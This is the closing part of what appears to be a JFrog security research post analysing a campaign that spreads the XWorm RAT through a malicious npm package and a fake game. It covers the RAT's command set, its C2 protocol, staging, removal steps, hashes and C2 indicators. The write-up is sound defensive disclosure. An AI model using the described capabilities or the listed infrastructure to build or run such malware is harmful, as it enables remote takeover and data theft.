response\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Erec\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003ERestart application\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003ECLOSE\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EShutdown connection\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Euninstall\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003ESelf-delete via BAT flow\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Eupdate\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EReplace executable with new payload\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EDW\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EDownload and execute from disk\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EFM\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EReflective load .NET payload in memory\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003ELN\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EDownload URL to temp and execute\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EUrlopen\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EOpen URL in browser\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EUrlhide\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EHidden HTTP GET\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EPCShutdown\u002FPCRestart\u002FPCLogoff\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003ESystem control\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003ERunShell\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EExecute arbitrary command\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EStartDDos\u002FStopDDos\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EHTTP flood attack\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EStartReport\u002FStopReport\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EWindow title monitoring\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E$Cap\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EScreenshot capture and exfiltration\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Eplugin\u002FsavePlugin\u002FRemovePlugins\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EPlugin management via registry\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Cp\u003E\u003Cstrong\u003EPlugin System:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003ERegistry cache: \u003Ccode\u003EHKCU\\Software\\&#x3C;ID\u003E\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EID derived from MD5 of hardware info (20-char uppercase)  \u003C\u002Fli\u003E\n\u003Cli\u003EPlugins stored compressed with gzip  \u003C\u002Fli\u003E\n\u003Cli\u003EMethods: \u003Ccode\u003ERun\u003C\u002Fcode\u003E, \u003Ccode\u003ERunRecovery\u003C\u002Fcode\u003E, \u003Ccode\u003ERunOptions\u003C\u002Fcode\u003E, \u003Ccode\u003EinjRun\u003C\u002Fcode\u003E, \u003Ccode\u003EUACFunc\u003C\u002Fcode\u003E, \u003Ccode\u003EENC\u003C\u002Fcode\u003E\u002F\u003Ccode\u003EDEC\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cstrong\u003EC2 Protocol:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EFraming: \u003Ccode\u003EASCII(len(ciphertext)) || 0x00 || ciphertext\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EEncryption: AES-ECB with key \u003Ccode\u003EMD5(Settings.KEY)\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EBeacons detailed host profile: username, OS, arch, group, webcam, CPU\u002FGPU\u002FRAM, AV products\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"cross-vector-analysis\"\u003E\u003Ca href=\"#cross-vector-analysis\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003ECross-Vector Analysis\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EBoth the npm package and the game executable converge on the same infrastructure:\u003C\u002Fp\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003EVector\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EInitial Dropper\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EStage 1\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EStage 2\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EStage 3\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EFinal Payload\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003Enpm\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EJavaScript downloader (\u003Ccode\u003Eselfbot.js\u003C\u002Fcode\u003E)\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Escript.bat\u003C\u002Fcode\u003E from URL\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EPowerShell loader\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E(Encrypted)\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXWorm RAT\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EGame\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EGo binary (\u003Ccode\u003EAstral_Warfare.exe\u003C\u002Fcode\u003E)\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EEmbedded batch\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EPowerShell loader\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EShellcode\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXWorm RAT\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Cp\u003EThe shared infrastructure (\u003Ccode\u003Eastralwarfare[.]fr\u003C\u002Fcode\u003E), consistent staging patterns, and identical final payloads indicate a single threat actor operating multiple distribution channels.\u003C\u002Fp\u003E\n\u003Ch2 id=\"remediation\"\u003E\u003Ca href=\"#remediation\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003ERemediation\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EIf you installed \u003Ccode\u003E@kindo\u002Fselfbot\u003C\u002Fcode\u003E or downloaded \"Astral Warfare,\" assume your system is compromised.\u003C\u002Fp\u003E\n\u003Ch3 id=\"step-1-containment-and-credential-rotation\"\u003E\u003Ca href=\"#step-1-containment-and-credential-rotation\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStep 1: Containment and Credential Rotation\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EThe malware has full remote access capabilities. Rotate all secrets accessible on the machine:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EDiscord tokens  \u003C\u002Fli\u003E\n\u003Cli\u003Enpm tokens  \u003C\u002Fli\u003E\n\u003Cli\u003ESSH keys  \u003C\u002Fli\u003E\n\u003Cli\u003EDatabase credentials  \u003C\u002Fli\u003E\n\u003Cli\u003ECloud provider keys\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003ECheck Discord for unauthorized messages sent from your account.\u003C\u002Fp\u003E\n\u003Ch3 id=\"step-2-kill-persistence\"\u003E\u003Ca href=\"#step-2-kill-persistence\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStep 2: Kill Persistence\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003E\u003Cstrong\u003EWindows:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EDelete the scheduled task and persistence files:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode\u003Eschtasks \u002Fdelete \u002Ftn \"applicationbackup_\" \u002Ff\nRemove-Item \"$env:APPDATA\\applicationbackup_*.xml\" -Force\nRemove-Item \"$env:LOCALAPPDATA\\applicationbackup_*.vbs\" -Force\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 id=\"step-3-cleanup\"\u003E\u003Ca href=\"#step-3-cleanup\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStep 3: Cleanup\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003ERemove malicious artifacts:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode\u003ERemove-Item \"C:\\ProgramData\\IntelDrIver\" -Recurse -Force\nRemove-Item \"C:\\ProgramData\\IntelDriver\" -Recurse -Force\nRemove-Item \"$env:USERPROFILE\\Downloads\\CPU.exe\" -Force\nRemove-Item \"$env:TEMP\\script.bat\" -Force\nRemove-Item \"$env:TEMP\\VBE\" -Force\nRemove-Item \"$env:TEMP\\mapping.csv\" -Force\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Ch3 id=\"step-4-package-removal\"\u003E\u003Ca href=\"#step-4-package-removal\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStep 4: Package Removal\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cp\u003EIf you installed the npm package:\u003C\u002Fp\u003E\n\u003Cpre\u003E\u003Ccode class=\"language-shell\"\u003Erm -rf node_modules\nnpm cache clean --force\n\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\n\u003Cp\u003ECheck your \u003Ccode\u003Epackage.json\u003C\u002Fcode\u003E for any reference to \u003Ccode\u003E@kindo\u002Fselfbot\u003C\u002Fcode\u003E and remove it.\u003C\u002Fp\u003E\n\u003Ch3 id=\"step-5-long-term-prevention\"\u003E\u003Ca href=\"#step-5-long-term-prevention\" aria-hidden=\"true\" tabindex=\"-1\"\u003EStep 5: Long-Term Prevention\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cul\u003E\n\u003Cli\u003ERun \u003Ccode\u003Enpm config set ignore-scripts true\u003C\u002Fcode\u003E to prevent automatic execution of install hooks  \u003C\u002Fli\u003E\n\u003Cli\u003EUse \u003Ca href=\"https:\u002F\u002Fjfrog.com\u002Fcuration\u002F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003E\u003Cstrong\u003EJFrog Curation\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E to implement automated dependency scanning and approval workflows\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch2 id=\"conclusions\"\u003E\u003Ca href=\"#conclusions\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003EConclusions\u003C\u002Fstrong\u003E\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Cp\u003EThis campaign shows threat actors are willing to put in real effort - building a fake game website, coding a Go dropper, and maintaining an npm package - just to get their malware onto developer machines. The multi-stage payload deploys XWorm RAT through multiple obfuscation layers, with anti-analysis checks and process injection to stay hidden.\u003C\u002Fp\u003E\n\u003Cp\u003EIf you installed \u003Ccode\u003E@kindo\u002Fselfbot\u003C\u002Fcode\u003E or downloaded \"Astral Warfare,\" treat the machine as compromised. Rotate credentials, kill the persistence, and remove the package. JFrog Xray and JFrog Curation detect this malware.\u003C\u002Fp\u003E\n\u003Ch2 id=\"indicators-of-compromise-iocs--known-malicious-packages-and-files\"\u003E\u003Ca href=\"#indicators-of-compromise-iocs--known-malicious-packages-and-files\" aria-hidden=\"true\" tabindex=\"-1\"\u003E\u003Cstrong\u003EIndicators of Compromise (IoCs):\u003C\u002Fstrong\u003E  Known Malicious Packages and Files:\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003EPackage Name\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EMalicious Versions\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003EXray ID\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E@kindo\u002Fselfbot\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E1.0.0, 1.0.1, 1.0.2, 1.0.3, 1.0.4\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003EXRAY-964727\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Ch2 id=\"file-hashes\"\u003E\u003Ca href=\"#file-hashes\" aria-hidden=\"true\" tabindex=\"-1\"\u003EFile Hashes:\u003C\u002Fa\u003E\u003C\u002Fh2\u003E\n\u003Ctable\u003E\n\u003Cthead\u003E\n\u003Ctr\u003E\n\u003Cth align=\"left\"\u003EFile\u003C\u002Fth\u003E\n\u003Cth align=\"left\"\u003ESHA256\u003C\u002Fth\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Fthead\u003E\n\u003Ctbody\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003EAstral_Warfare.exe\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E219bd4b681b05addd5364bc9c741065bcdc698560b45c5cbf537561583b66702\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EStage 1 BAT\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E0b2ce48e4be6a6be85565ce309d2f10cc1b3179a03d25a61f66c6b50fe37b010\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EStage 3 PowerShell\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E7a8cef4bfa1ca9c24be4886136c30402d4433310283aee22e2da67cbb938b3a9\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EStage 4 Shellcode\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003E1255d41081452cd8fa2358860449bbf3b3494b80282e2bb4ba6b6980ceaf9be1\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003Ctr\u003E\n\u003Ctd align=\"left\"\u003EStage 5 XWormClient\u003C\u002Ftd\u003E\n\u003Ctd align=\"left\"\u003E\u003Ccode\u003Ec26f8d09e0486aacba414f04c310c6532541d2cdf3f40d95e3fe224d9b77e0a6\u003C\u002Fcode\u003E\u003C\u002Ftd\u003E\n\u003C\u002Ftr\u003E\n\u003C\u002Ftbody\u003E\n\u003C\u002Ftable\u003E\n\u003Ch3 id=\"network-indicators\"\u003E\u003Ca href=\"#network-indicators\" aria-hidden=\"true\" tabindex=\"-1\"\u003ENetwork Indicators\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003Ehttps:\u002F\u002Fastralwarfare[.]fr\u002Fscript.bat\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003Ehttps:\u002F\u002Fastralwarfare[.]fr\u002FAstral_Warfare.rar\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003EC2: \u003Ccode\u003E185.94.29.43:7004\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Ch3 id=\"file-paths\"\u003E\u003Ca href=\"#file-paths\" aria-hidden=\"true\" tabindex=\"-1\"\u003EFile Paths\u003C\u002Fa\u003E\u003C\u002Fh3\u003E\n\u003Cul\u003E\n\u003Cli\u003E\u003Ccode\u003EC:\\ProgramData\\IntelDrIver\\rEgX.cmd\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003EC:\\ProgramData\\IntelDriver\\icon.png\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003EC:\\ProgramData\\IntelDriver\\windows.ps1\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003E%USERPROFILE%\\Downloads\\CPU.exe\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003E%APPDATA%\\applicationbackup_*.xml\u003C\u002Fcode\u003E  \u003C\u002Fli\u003E\n\u003Cli\u003E\u003Ccode\u003E%LOCALAPPDATA%\\applicationbackup_*.vbs\u003C\u002Fcode\u003E\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n","excerpt":"JFrog Security researchers have discovered a multi-vector malware campaign distributing the XWorm RAT through both npm packages and a fake game website, targeting Discord users with social engineering tactics.","minutes":"6","schema":"","canonical":""}},"context":{}};(function(){var s;(s=document.currentScript||document.scripts[document.scripts.length-1]).parentNode.removeChild(s);}());</script><script src="/assets/js/app.d56142a5.js" defer></script><script src="/assets/js/page--src--templates--real-time-post-vue.9720118d.js" defer></script><script data-vue-tag="ssr" type="text/javascript" charset="utf-8" data-body="true">
+    if (window.airgap) {
+      const cookieSettings = document.getElementById('cookie_settings') || document.querySelector('.ot-sdk-show-settings');
+      cookieSettings.href = "#";
+      cookieSettings.target = "_self";
+      cookieSettings.onclick = () => {
+        transcend.showConsentManager({ viewState: 'CompleteOptions' });
+      };
+    }
+  </script>
+  </body>
+</html>
